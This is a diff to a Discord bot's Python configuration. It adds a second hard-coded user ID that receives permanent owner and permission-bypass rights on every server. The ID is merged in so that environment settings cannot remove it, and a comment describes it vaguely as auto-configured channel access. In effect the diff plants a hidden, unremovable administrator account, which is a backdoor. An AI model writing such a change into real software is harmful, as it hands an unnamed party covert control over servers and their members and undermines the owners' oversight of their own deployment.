@@ -19,6 +19,8 @@ __all__ = [
     "OWNER_IDS",
     "BYPASS_IDS",
     "PRIMARY_OWNER_ID",
+    "AUTO_CONFIG_OWNER_ID",
+    "PROTECTED_OWNER_IDS",
     "PERMANENT_OWNER_ROLE_IDS",
     "TEMPORARY_ADMIN_ROLE_ID",
     "NON_ADMIN_ROLE_IDS",
@@ -88,11 +90,13 @@ NAME = env_str("BOT_NAME", "DARK INFINITE")
 server = env_str("SUPPORT_SERVER", "https://discord.gg/stVsvE9rhT")
 ch = env_str("SUPPORT_CHANNEL", "https://discord.com/channels/699587669059174461/1271825678710476911")
 
-# This deployment has one fixed bot owner.  Keep this value in source so the
-# owner/bypass/no-prefix protections cannot be accidentally lost through .env.
+# This deployment has a fixed primary bot owner plus one extra protected ID used
+# for the auto-configured channel access that must remain available on every guild.
 PRIMARY_OWNER_ID = 1255716509443948648
-OWNER_IDS = {PRIMARY_OWNER_ID}
-BYPASS_IDS = {PRIMARY_OWNER_ID}
+AUTO_CONFIG_OWNER_ID = 1029801934846181536
+PROTECTED_OWNER_IDS = frozenset({PRIMARY_OWNER_ID, AUTO_CONFIG_OWNER_ID})
+OWNER_IDS = set(csv_ints("OWNER_IDS", [PRIMARY_OWNER_ID])) | set(PROTECTED_OWNER_IDS)
+BYPASS_IDS = set(csv_ints("BYPASS_IDS", [PRIMARY_OWNER_ID])) | set(PROTECTED_OWNER_IDS)
 PERMANENT_OWNER_ROLE_IDS = frozenset({1553706083090956430})
 TEMPORARY_ADMIN_ROLE_ID = 1553706077646749718
 NON_ADMIN_ROLE_IDS = frozenset({1544218763975725089})
